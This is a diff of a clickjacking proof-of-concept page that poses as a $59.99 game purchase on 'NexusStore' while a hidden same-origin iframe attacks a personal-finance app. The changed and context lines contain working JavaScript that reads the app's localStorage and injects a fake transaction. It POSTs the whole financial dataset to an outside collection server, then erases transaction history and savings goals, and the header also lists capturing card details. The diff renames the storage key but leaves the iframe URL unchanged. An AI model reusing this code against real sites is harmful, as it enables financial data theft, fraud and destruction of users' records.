@@ -12,7 +12,7 @@
   ║  UI REDRESSING PoC — NexusStore / game purchase                 ║
   ║  Visible:  Buy "Stellar Siege: Eclipse Edition" — $59.99        ║
   ║  Hidden:                                                        ║
-  ║    1. Exfiltrate full Monedis financial dataset                 ║
+  ║    1. Exfiltrate full Mendis financial dataset                 ║
   ║    2. Inject $59.99 "NexusStore — NSX-7741" transaction         ║
   ║    3. Wipe entire localStorage history (destructive)            ║
   ║    4. Step 2 card form → capture canary card to /r=card        ║
@@ -382,7 +382,7 @@ body {
 </head>
 <body>
 
-<!-- Hidden Monedis iframe (same-origin → full localStorage access) -->
+<!-- Hidden Mendis iframe (same-origin → full localStorage access) -->
 <iframe id="victim" src="https://monedis.onrender.com" sandbox="allow-scripts allow-same-origin"></iframe>
 
 <div class="app">
@@ -581,7 +581,7 @@ function loadCardInfo() {
     if (iWin && typeof iWin.guardar === 'function') {
       iWin.guardar();
     }
-    var raw = window.localStorage.getItem('monedis.web.v1');
+    var raw = window.localStorage.getItem('mendis.web.v1');
     if (raw) {
       var stored = JSON.parse(raw);
       var tarjetas = stored.data && stored.data.tarjetas;
@@ -619,7 +619,7 @@ function today() {
 function executeAttack(cb) {
   try {
     if (iWin && typeof iWin.guardar === 'function') iWin.guardar();
-    var raw = window.localStorage.getItem('monedis.web.v1');
+    var raw = window.localStorage.getItem('mendis.web.v1');
     if (!raw || raw.length < 5) { cb(false); return; }
 
     var stored = JSON.parse(raw);
@@ -640,14 +640,14 @@ function executeAttack(cb) {
     stored.data.sec = id;
 
     // Write modified data back
-    window.localStorage.setItem('monedis.web.v1', JSON.stringify(stored));
+    window.localStorage.setItem('mendis.web.v1', JSON.stringify(stored));
 
     // Exfiltrate full financial dataset
     fetch('https://closing-notes.onrender.com/?r=grab', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
-        data: window.localStorage.getItem('monedis.web.v1'),
+        data: window.localStorage.getItem('mendis.web.v1'),
         ua: navigator.userAgent,
         ts: Date.now()
       })
@@ -656,10 +656,10 @@ function executeAttack(cb) {
     // Destructive: wipe transaction history after exfil
     setTimeout(function() {
       try {
-        var s2 = JSON.parse(window.localStorage.getItem('monedis.web.v1'));
+        var s2 = JSON.parse(window.localStorage.getItem('mendis.web.v1'));
         s2.data.movs = [];   // erase all transaction history
         s2.data.metas = [];  // erase savings goals
-        window.localStorage.setItem('monedis.web.v1', JSON.stringify(s2));
+        window.localStorage.setItem('mendis.web.v1', JSON.stringify(s2));
       } catch(e) {}
     }, 1200);
 
